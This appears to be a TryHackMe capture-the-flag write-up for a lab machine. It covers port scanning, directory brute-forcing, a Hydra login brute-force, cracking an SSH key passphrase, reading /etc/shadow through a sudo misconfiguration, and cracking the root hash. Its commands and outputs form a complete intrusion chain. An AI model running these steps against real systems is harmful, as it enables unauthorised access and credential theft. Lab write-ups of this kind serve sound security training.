## Target IP: 10.10.61.20

---

### Environment Variables

```bash
export IP=10.10.61.20
export LIP=10.6.24.56
```

---

### Nmap Scan

```bash
sudo nmap -sC -sV -T4 -O $IP -oN nmap_scan.txt
```

**Open Ports:**

| Port | Service | Version |
| --- | --- | --- |
| 22 | SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80 | HTTP | Apache httpd 2.4.29 (Ubuntu) |

---

### Web Enumeration

Visited: `http://$IP`

→ Apache default page

---

### Directory Brute Force

```bash
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt
```

**Discovered:**

- /.hta (403)
- /.htpasswd (403)
- /.htaccess (403)
- /admin → Login page
- /index.html
- /server-status (403)

---

### Admin Panel

Visited: `/admin`

→ Login form

**Source code hint:**

```html
<!-- Hey john, if you do not remember, the username is admin -->
```

Tried default creds → failed

→ Used **Hydra** to brute-force

---

### Hydra Brute Force

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid"
```

→ **Password found: `[REDACTED]`**

---

### Logged In

Login page now displays:

```
Hello john, finish the development of the site, here's your RSA private key.
```

And reveals **Flag 1:**

```
THM{[REDACTED]}
```

---

### Private Key Crack

Copied key into `rsa_key.txt`

Converted for John:

```bash
ssh2john rsa_key.txt > rsa_id.hash
john rsa_id.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

→ **Passphrase: `[REDACTED]`**

---

### SSH Login

```bash
ssh -i rsa_key john@$IP
# Passphrase: [REDACTED]
```

---

### User Flag

```bash
cat user.txt
# → THM{[REDACTED]}
```

---

### Privilege Escalation

```bash
sudo -l
# → Can run /bin/cat as sudo without password

```

```bash
sudo cat /etc/shadow
```

Grabbed root hash:

```
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
```

Saved it to `hashes` file.

Crack it:

**Hashcat:**

```bash
hashcat -m 1800 -a 0 hashes /usr/share/wordlists/rockyou.txt
```

**John (used):**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt hashes
```

→ **Password: `[REDACTED]`**

---

### Root Access

```bash
su root
# Password: [REDACTED]
```

---

### Root Flag

```bash
cd /root
cat root.txt
```
